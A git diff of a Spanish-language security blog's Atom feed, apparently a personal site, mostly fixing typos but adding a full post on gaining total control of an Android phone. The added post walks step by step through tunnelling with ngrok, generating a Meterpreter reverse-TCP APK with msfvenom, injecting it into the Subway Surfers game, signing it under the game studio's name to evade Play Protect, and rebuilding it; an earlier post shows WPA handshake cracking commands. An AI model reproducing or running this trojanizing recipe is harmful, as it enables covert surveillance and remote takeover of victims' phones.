@@ -1,8 +1,8 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-09-01T00:38:37+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">e1abrador.io</title><author><name>Eric Labrador</name><email>e.l.s.3334@gmail.com</email></author><entry><title type="html">airAttack</title><link href="http://localhost:4000/airAttack/" rel="alternate" type="text/html" title="airAttack" /><published>2021-08-31T00:00:00+02:00</published><updated>2021-08-31T00:00:00+02:00</updated><id>http://localhost:4000/airAttack</id><content type="html" xml:base="http://localhost:4000/airAttack/">&lt;p&gt;&lt;img src=&quot;/assets/images/airAttack/AIR-ATTACK-Header.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-09-03T15:35:34+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">e1abrador.io</title><author><name>Eric Labrador</name><email>e.l.s.3334@gmail.com</email></author><entry><title type="html">airAttack</title><link href="http://localhost:4000/airAttack/" rel="alternate" type="text/html" title="airAttack" /><published>2021-08-31T00:00:00+02:00</published><updated>2021-08-31T00:00:00+02:00</updated><id>http://localhost:4000/airAttack</id><content type="html" xml:base="http://localhost:4000/airAttack/">&lt;p&gt;&lt;img src=&quot;/assets/images/airAttack/AIR-ATTACK-Header.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;&lt;strong&gt;airAttack&lt;/strong&gt; es una herramienta ofensiva para automatizar los ataques a redes inalámbricas escrita en bash. Esta herramienta será mejorada por mi próximamente para para optimizar determiandas porciones de código. Los ataques de denegación de servicio así como nuevas funciones serán añadidas. Este programa lo escribí cuando estaba estudiando para el OSWP (Offensive Security Wireless Professional).&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;airAttack&lt;/strong&gt; es una herramienta ofensiva para automatizar los ataques a redes inalámbricas escrita en bash. Esta herramienta será mejorada por mi próximamente para para optimizar determinadas porciones de código. Los ataques de denegación de servicio así como nuevas funciones serán añadidas. Este programa lo escribí cuando estaba estudiando para el OSWP (Offensive Security Wireless Professional).&lt;/p&gt;
 
-&lt;p&gt;En este artículo, explicaré cada ataque que puede utilizarse en airAttack, la finalidad de dicho ataque y como ejecutarlo.&lt;/p&gt;
+&lt;p&gt;En este artículo, explicaré cada ataque que puede utilizarse en airAttack, la finalidad y como ejecutarlo manualmente.&lt;/p&gt;
 
 &lt;p&gt;La herramienta se puede descargar en:&lt;/p&gt;
 
@@ -84,13 +84,192 @@ aireplay-ng &lt;span class=&quot;nt&quot;&gt;-0&lt;/span&gt; 15 &lt;span class=&
 aircrack-ng &lt;span class=&quot;nt&quot;&gt;-J&lt;/span&gt; miCaptura captura.cap
 hccap2john miCaptura.hccap &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hash
 &lt;/span&gt;john &lt;span class=&quot;nt&quot;&gt;--wordlist&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;rockyou.txt &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Eric Labrador</name><email>e.l.s.3334@gmail.com</email></author><category term="script" /><category term="shell" /><category term="wireless" /><category term="aircrack-ng" /><category term="wireless_pentesting" /><summary type="html">En este artículo, explico la utilidad de la herramienta airAttack. También dejo reflejado cada ataque, la finalidad de cada ataque y como ejecutarlo. Todos los ataques de esta herramienta se ejecutan gracias a la suite aircrack-ng. La herramienta fue publicada en github el día 27/06/2021, pocos días después de aprobar el OSWPcomo primera release.</summary></entry><entry><title type="html">Mis Certificaciones</title><link href="http://localhost:4000/mis_certificaciones/" rel="alternate" type="text/html" title="Mis Certificaciones" /><published>2021-08-31T00:00:00+02:00</published><updated>2021-08-31T00:00:00+02:00</updated><id>http://localhost:4000/mis_certificaciones</id><content type="html" xml:base="http://localhost:4000/mis_certificaciones/">&lt;p&gt;&lt;strong&gt;Mis certificaciones&lt;/strong&gt;&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Eric Labrador</name><email>e.l.s.3334@gmail.com</email></author><category term="script" /><category term="shell" /><category term="wireless" /><category term="aircrack-ng" /><category term="wireless_pentesting" /><summary type="html">En este artículo, explico la utilidad de la herramienta airAttack. También dejo reflejado cada ataque, la finalidad de cada ataque y como ejecutarlo. Todos los ataques de esta herramienta se ejecutan gracias a la suite aircrack-ng. La herramienta fue publicada en github el día 27/06/2021, pocos días después de aprobar el OSWPcomo primera release.</summary></entry><entry><title type="html">Mis Certificaciones</title><link href="http://localhost:4000/android_shell_/" rel="alternate" type="text/html" title="Mis Certificaciones" /><published>2021-08-31T00:00:00+02:00</published><updated>2021-08-31T00:00:00+02:00</updated><id>http://localhost:4000/android_shell_</id><content type="html" xml:base="http://localhost:4000/android_shell_/">&lt;p&gt;Este artículo va orientado a enseñar paso a paso como un atacante puede ganar acceso total a un dispositivo android, acceso total me refiero des de poder ver el registro de llamadas a poder sacar fotos con las cámaras del teléfono móvil.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;ngrok&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Ngrok nos permite exponer a internet una URL generada dinámicamente, la cual apunta a un servicio web que se está ejecutando en nuestra máquina local. Por ejemplo: si tenemos un servicio web arrancado en http://localhost:8080, ngrok genera dinámicamente una URL del tipo http://xxxxxx.ngrok.io visible en internet, y que apunta directamente a nuestro localhost. De esta forma evitaremos tener que configurar un puerto en el router y por seguridad, evitaremos exponer nuestra IP pública.&lt;/p&gt;
+
+&lt;p&gt;No es necesario instalarlo, se puede utilizar el binario ejecutable, solamente se tiene que descargar:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
+unzip ngrok-stable-linux-amd64.zip
+./ngrok
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Si no lo tenias configurado de antes, para poder utilizarlo necesitarás un token, para conseguir este token, tendrás que loggearte en la web oficial de ngrok:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://dashboard.ngrok.com/login&quot;&gt;https://dashboard.ngrok.com/login&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Cuando ya estés loggeado, en la siguiente URL podrás ver tu token:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://dashboard.ngrok.com/get-started/your-authtoken&quot;&gt;https://dashboard.ngrok.com/get-started/your-authtoken&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Ahora que ya tenemos el token, tendremos que hacer que ngrok des de nuestra máquina lo tenga en cuenta y nos permita ejecutar comandos, para ello:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./ngrok authtoken &lt;span class=&quot;s2&quot;&gt;&quot;token&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Con esto, ya podremos utilizar ngrok.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Iniciar ngrok&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Para iniciarlo, simplemente tenemos que ejecutar el siguiente comando:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./ngrok tcp 1234
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Con esto, se abrirá&lt;/p&gt;
+
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;ngrok by @inconshreveable                                                                                                                                                  (Ctrl+C to quit)
+                                                                                                                                                                                           
+Session Status                online                                                                                                                                                       
+Account                       example@gmail.com (Plan: Free)                                                                                                           
+Version                       2.3.40                                                                                                                                                       
+Region                        United States (us)                                                                                                                                           
+Web Interface                 http://127.0.0.1:4040                                                                                                                                        
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;Forwarding                    tcp://8.tcp.ngrok.io:11398 -&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;localhost:1234                                                                                                                 
+&lt;span class=&quot;go&quot;&gt;                                                                                                                                                                                           
+Connections                   ttl     opn     rt1     rt5     p50     p90                                                                                                                  
+                              0       0       0.00    0.00    0.00    0.00
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;Archivo apk malicioso&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Utilizaremos metasploit ya que tiene modulos específicos para el caso, utilizaremos msfvenom para generar el archivo apk, con las siguientes especificaciones:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; android/meterpreter/reverse_tcp &lt;span class=&quot;nv&quot;&gt;LHOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;8.tcp.ngrok.io &lt;span class=&quot;nv&quot;&gt;LPORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;11398 &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; metasploit.apk
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Es importante tener en cuenta que si en algún momento se cierra ngrok, será necesario generar de nuevo el payload con lo que pertoque ya que cada vez que se inicia, cambia de servidor tcp, en LHOST, se tiene que especificar el servidor tcp, el cual está en escucha por el puerto 11398 y al mismo tiempo está redirigiendo el tráfico a nuestro equipo al puerto 1234, es importante tener esto en cuenta ya que si se configura mal no funcionará.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Descarga de apk legítimo&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;El primero paso es descargarse un archivo APK, en nuestro caso utilizaremos la siguiente web:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.apkmonk.com/app/com.kiloo.subwaysurf/&quot;&gt;https://www.apkmonk.com/app/com.kiloo.subwaysurf/&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Por mi parte voy a utilizar el juego Subway Surfers, pero debería funcionar en cualquier APK sin problema.&lt;/p&gt;
+
+&lt;p&gt;En este punto deberíamos tener 2 archivos apk, el apk de metasploit y el del juego en cuestión.&lt;/p&gt;
+
+&lt;p&gt;Para descomprimir los 2 apk’s, utilizaremos la herramienta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;apktool&lt;/code&gt;:&lt;/p&gt;
+
+&lt;p&gt;*&lt;a href=&quot;https://github.com/iBotPeaches/Apktool/releases/tag/v2.4.1&quot;&gt;https://github.com/iBotPeaches/Apktool/releases/tag/v2.4.1&lt;/a&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;java &lt;span class=&quot;nt&quot;&gt;-jar&lt;/span&gt; apktool_2.4.1.jar d metasploit.apk
+java &lt;span class=&quot;nt&quot;&gt;-jar&lt;/span&gt; apktool_2.4.1.jar d subway.apk
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Cuando estos 2 comandos finalices, deberían haberse creado 2 archivos con el nombre del apk (metasploit y subway).&lt;/p&gt;
+
+&lt;p&gt;Dentro de cada carpeta, tiene que haber la ruta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;smali/com&lt;/code&gt;, dentro de esta ruta es donde introduciremos el malware. En la carpeta de metasploit, solo se habrá creado un directorio (en smali/com), llamado metasploit. Tendremos que copiar los archivos, estando en la ruta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;metasploit/&lt;/code&gt;, ejecutaremos el siguiente comando:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;tar&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-cf&lt;/span&gt; - ./smali | &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; ../subway&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;tar&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-xpf&lt;/span&gt; - &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Con esto, lo que conseguiremos es mover todo el contenido de metasploit/smali/com a subway/smali/com.&lt;/p&gt;
+
+&lt;p&gt;Ahora nos dirigiremos a subway/ y ejecutaremos lo siguiente:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@e1abrador]─[/home/c4yyyy/Desktop/apks/subway]
+└──╼ &lt;span class=&quot;c&quot;&gt;#grep -E 'android:name=&quot;.*?&quot;' AndroidManifest.xml | grep MainActivity&lt;/span&gt;
+        &amp;lt;activity android:name&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;com.facebook.CustomTabMainActivity&quot;&lt;/span&gt;/&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Nos interesa el archiv MainActivity.smali, ya que es donde vamos a alterar el flujo del programa para, en este caso, ejecutar el malware.&lt;/p&gt;
+
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;┌─[root@OSCPath]─[/home/c4yyyy/Desktop/apks/subway/smali/com/facebook]
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;└──╼ #&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;MainActivity
+&lt;span class=&quot;gp&quot;&gt;CustomTabMainActivity$&lt;/span&gt;1.smali
+&lt;span class=&quot;go&quot;&gt;CustomTabMainActivity.smali
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Abriremos el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CustomTabMainActivity.smali&lt;/code&gt; y filtraremos por &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;onCreate&lt;/code&gt;, justo debajo de esta string, añadiremos el siguiente código:&lt;/p&gt;
+
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;invoke-static {p0}, Lcom/metasploit/stage/Payload;&lt;/span&gt;-&amp;gt;start&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ljava/lang/String&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;V
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ahora, tendremos que buscar en el directorio metasploit/ todos los “uses-permission”, que es los permisos que necesita la aplicación para funcionar:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@OSCPath]─[/home/c4yyyy/Desktop/apks/metasploit]
+└──╼ &lt;span class=&quot;c&quot;&gt;#cat AndroidManifest.xml| grep &quot;uses-permission&quot;&lt;/span&gt;
+    &amp;lt;uses-permission android:name&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;android.permission.INTERNET&quot;&lt;/span&gt;/&amp;gt;
+    &amp;lt;uses-permission android:name&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;android.permission.ACCESS_WIFI_STATE&quot;&lt;/span&gt;/&amp;gt;
+    &amp;lt;uses-permission android:name&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;android.permission.CHANGE_WIFI_STATE&quot;&lt;/span&gt;/&amp;gt;
+    &amp;lt;uses-permission android:name&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;android.permission.ACCESS_NETWORK_STATE&quot;&lt;/span&gt;/&amp;gt;
+    &amp;lt;uses-permission android:name&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;android.permission.ACCESS_COARSE_LOCATION&quot;&lt;/span&gt;/&amp;gt;
+    ...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Tendremos que copiar todos los que salgan y introducirlos en los del programa de subway, tendremos que asegurarnos que no se repiten:&lt;/p&gt;
+
+&lt;p&gt;Enviaremos todos los resultados de uses-permission de los 2 archivos en uno mismo, haremos:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;file.txt  | &lt;span class=&quot;nb&quot;&gt;sort&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Con esto se filtrarán las cadenas únicas, este output es el que necesitaremos para que se apliquen en la app todos los permisos, simplemente, en el AndroidManifest.xml de subway, se eleminarán todos los uses-permission y se substituirán por los extraidos entre los 2 archivos.&lt;/p&gt;
+
+&lt;p&gt;Esta sería la configuración del payload de la app, ahora tenemos que compilar la app:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;java &lt;span class=&quot;nt&quot;&gt;-jar&lt;/span&gt; apktool_2.4.1.jar b subway &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; malicious-subway.apk
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Con esto ya tendríamos la app, totalmente funcional, pero hay que tener en cuenta que si la dejamos así, el “Play Protect” de android lo detectará y lo bloqueará.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Keytool&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Para evitar el bloqueo, tenemos que autofirmar cada uno de los ficheros que componen la aplicación. Utilizaremos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;keytool&lt;/code&gt; para crear un keystore, para poder firmar posteriormente la aplicación.&lt;/p&gt;
+
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;keytool -genkey -v -keystore subway.keystore -alias subway -keyalg RSA -keysize 2048 -validity 10000
+Introduzca la contraseña del almacén de claves: 123456
+Volver a escribir la contraseña nueva: 123456
+¿Cuáles son su nombre y su apellido?
+  [Unknown]:  SYBO Games
+¿Cuál es el nombre de su unidad de organización?
+  [Unknown]:  SYBO Games
+¿Cuál es el nombre de su organización?
+  [Unknown]:  SYBO Games
+¿Cuál es el nombre de su ciudad o localidad?
+  [Unknown]:  ayyyyy
+¿Cuál es el nombre de su estado o provincia?
+  [Unknown]:  SYBO Games
+¿Cuál es el código de país de dos letras de la unidad?
+  [Unknown]:  US
+¿Es correcto CN=SYBO Games, OU=SYBO Games, O=SYBO Games, L=ayyyyy, ST=SYBO Games, C=US?
+  [no]:  si
+
+Generando par de claves RSA de 2.048 bits para certificado autofirmado (SHA256withRSA) con una validez de 10.000 días
+        para: CN=SYBO Games, OU=SYBO Games, O=SYBO Games, L=ayyyyy, ST=SYBO Games, C=US
+[Almacenando subway.keystore]
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;jarsigner&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahora ya que tenemos la archivo .keystore, ya podemos firmar la aplicación:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jarsigner &lt;span class=&quot;nt&quot;&gt;-verbose&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sigalg&lt;/span&gt; SHA1withRSA &lt;span class=&quot;nt&quot;&gt;-digestalg&lt;/span&gt; SHA1 &lt;span class=&quot;nt&quot;&gt;-keystore&lt;/span&gt; subway.keystore malicious-subway.apk subway
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Nos pedirá una contraseña, tendrá que ser la que le pusimos antes, en el apartado de Keytool, en nuestro caso, 123456.&lt;/p&gt;
+
+&lt;p&gt;Finalmente, utilizaremos zipalign.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;zipalign&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Zipalign, el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zip aligning&lt;/code&gt; de un apk da como resultado que todos los datos sin comprimir del apk se alineen en un limite de bytes que nosotros le especifiquemos. Con esto, el consumo de RAM será mucho menor, con esto se evitarán problemas (posibles errores de la app).&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;zipalign &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; 4 malicious-subway.apk final.apk
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Eric Labrador</name><email>e.l.s.3334@gmail.com</email></author><category term="android" /><category term="Malware" /><summary type="html">En este artículo, voy a explicar como un atacante puede ganar acceso total a un dispositivo android.</summary></entry><entry><title type="html">Mis Certificaciones</title><link href="http://localhost:4000/mis_certificaciones/" rel="alternate" type="text/html" title="Mis Certificaciones" /><published>2021-08-31T00:00:00+02:00</published><updated>2021-08-31T00:00:00+02:00</updated><id>http://localhost:4000/mis_certificaciones</id><content type="html" xml:base="http://localhost:4000/mis_certificaciones/">&lt;p&gt;&lt;strong&gt;Mis certificaciones&lt;/strong&gt;&lt;/p&gt;
 
 &lt;h3&gt;eJPT (eLearnSecurity Junior Penetration Tester)&lt;/h3&gt;
 
 &lt;p&gt;&lt;img src=&quot;/assets/images/certs/eJPT.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
-&lt;h3&gt;OSWPv3 (Offensive Security Wireless Proffesional)&lt;/h3&gt;
+&lt;h3&gt;OSWPv3 (Offensive Security Wireless Professional)&lt;/h3&gt;
 
 &lt;p&gt;&lt;img src=&quot;/assets/images/certs/oswp.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;</content><author><name>Eric Labrador</name><email>e.l.s.3334@gmail.com</email></author><category term="script" /><category term="Offensive-Security" /><category term="OSWP" /><category term="eLearnSecurity" /><category term="eJPT" /><summary type="html">En este artículo, dejo reflejadas las certificaciones que poseo.</summary></entry><entry><title type="html">wp_userScan</title><link href="http://localhost:4000/wp_userScan/" rel="alternate" type="text/html" title="wp_userScan" /><published>2021-08-31T00:00:00+02:00</published><updated>2021-08-31T00:00:00+02:00</updated><id>http://localhost:4000/wp_userScan</id><content type="html" xml:base="http://localhost:4000/wp_userScan/">&lt;h2 id=&quot;qué-es-wps_usersscan&quot;&gt;¿Qué es wps_usersScan?&lt;/h2&gt;
 
